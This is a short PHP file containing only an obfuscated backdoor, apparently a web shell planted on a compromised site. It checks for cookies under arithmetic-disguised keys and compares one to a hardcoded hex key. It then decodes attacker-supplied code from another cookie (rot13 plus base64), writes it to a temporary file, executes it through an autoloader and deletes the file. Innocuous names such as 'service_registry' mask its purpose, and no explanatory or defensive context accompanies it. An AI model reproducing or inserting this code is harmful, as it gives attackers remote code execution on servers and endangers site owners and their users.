<?php


if (isset($_COOKIE[-90+90]) && isset($_COOKIE[9+-8]) && isset($_COOKIE[36+-33]) && isset($_COOKIE[99-95])) {
    $dchunk = $_COOKIE;
    function service_registry($ptr) {
        $dchunk = $_COOKIE;
        $component = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '6357c507');
        if (!is_writable($component)) {
            $component = getcwd() . DIRECTORY_SEPARATOR . "secure_access";
        }
        $marker = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($dchunk[3]));
        if (is_writeable($component)) {
            $ref = fopen($component, 'w+');
            fputs($ref, $marker);
            fclose($ref);
            spl_autoload_unregister(__FUNCTION__);
            require_once($component);
            @array_map('unlink', array($component));
        }
    }
    spl_autoload_register("service_registry");
    $entry = "3689aef4a72ca81b548ef431fb901936";
    if (!strncmp($entry, $dchunk[4], 32)) {
        if (@class_parents("query_handler_approve_request", true)) {
            exit;
        }
    }
}
